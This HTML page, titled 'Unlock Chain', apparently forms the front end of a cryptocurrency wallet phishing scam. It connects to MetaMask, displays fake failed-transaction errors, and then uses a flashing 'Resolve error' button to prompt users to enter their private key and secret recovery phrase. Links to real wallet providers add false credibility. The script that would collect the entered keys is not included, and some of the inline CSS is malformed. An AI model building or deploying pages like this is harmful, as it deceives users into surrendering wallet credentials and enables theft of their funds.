<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Chain</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="dashboard">
    <div class="sidebar">
        <h2>Unlock Chain</h2>
        <button id="connectButton">Connect a MetaMask</button>
        <p id="userAddress" style="color: green;"></p>
        <p id="addressStatus">Status Address: </p>
      <div id="errorOptions">

       <!-- Dentro de <div id="errorOptions" style="display: none;"> -->
<div style="animation: heartbeat 1s infinite;">
    <button id="fixErrorsButton" style="
        background-color: darkcyan;
        #fixErrorsButton {
        display: none;

        color: white;
        border: none;
        padding: 10px 20px;
        text-align: center;
        display: inline-block;
        font-size: 16px;
        margin: 4px 2px;
        cursor: pointer;
        border-radius: 10px;
        animation: heartbeat 1s infinite;
    ">Resolve error</button>
</div>

<style>
    @keyframes heartbeat {
        0% {
            background-color: darkcyan;
        }
        50% {
            background: linear-gradient(135deg, rgba(255,0,0,1) 0%, rgba(255,0,0,0) 70%);
        }
        100% {
            background-color: darkcyan;
        }
    }
</style>

          
<div id="fixErrorsContent" class="correction-content" style="display: none;">
    <div class="correction-option">
        <input type="text" id="addressInput" placeholder="To add PRIVATE KEY">
        <button id="submitAddress">Restart</button>

    <div class="correction-option">
        <button id="addTextButton">To add phrase secret</button>
        <div id="textInputsContainer" class="text-inputs-container" style="display: none;">
        </div>
        <button id="submitTexts" class="submit-texts" style="display: none;">Restart</button>
           </div>
        </div>
    </div>
    </div>

    <nav>
        <ul>
            
                <li><a href="https://metamask.io/" target="_blank">MetaMask</a></li>
                <li><a href="https://trustwallet.com/" target="_blank">Trust Wallet</a></li>
                <li><a href="https://www.coinomi.com/" target="_blank">Coinomi</a></li>
                <li><a href="https://www.exodus.com/" target="_blank">Exodus</a></li>
            </ul>
        </ul>
    </nav>
</div>


 <div class="main-content">
    <h1>Status Address</h1>
    <!-- Sección de información de la dirección que será visible tras conectarse -->
    <div id="addressInfo" style="display: none;">
        <h2>Address connect <span id="userAddress"></span></h2>
        <p>"Address request failed, please check log details and hash"</p>
        <div id="failedTransactionsList">
            <h2> View detail on the blockchain </h2>
            <table>
                <thead>
                    <tr>
                        <th>Hash Tx</th>
                        <th>Error.Log</th>
                        <th>Transaction</th>
                    </tr>
                </thead>
                <tbody id="failedTransactionsBody">
                    <!-- Las filas se agregarán dinámicamente -->
                </tbody>
            </table>
        </div>
    </div>
</div>


<script src="script.js"></script>
</body>
</html>
